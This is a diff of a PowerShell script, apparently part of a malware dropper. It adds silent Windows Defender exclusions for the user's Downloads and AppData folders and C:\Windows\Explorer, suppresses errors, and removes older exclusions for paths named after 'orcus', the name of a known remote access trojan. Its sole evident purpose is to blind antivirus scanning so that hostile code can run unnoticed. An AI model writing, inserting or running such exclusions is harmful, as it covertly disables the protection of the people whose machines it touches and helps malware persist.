@@ -1,5 +1,14 @@
 $ProgressPreference = 'SilentlyContinue'
 
+$downloadsPath = "$env:USERPROFILE\Downloads"
+$appDataPath = "$env:USERPROFILE\AppData"
+$explorerPath = "C:\Windows\Explorer"
+try {
+    Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $explorerPath -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
 Clear-Host
 
 $scriptPath = $MyInvocation.MyCommand.Path
@@ -41,11 +50,8 @@ $downloadsPath = "$env:USERPROFILE\Downloads"
 $appDataPath = "$env:USERPROFILE\AppData"
 $explorerPath = "C:\Windows\Explorer"
 try {
-    Add-MpPreference -ExclusionPath $orcusPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
-    Add-MpPreference -ExclusionPath $orcusPath2 -ErrorAction SilentlyContinue | Out-Null
-    Add-MpPreference -ExclusionPath $localhostPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $explorerPath -ErrorAction SilentlyContinue | Out-Null
 }
 catch {}
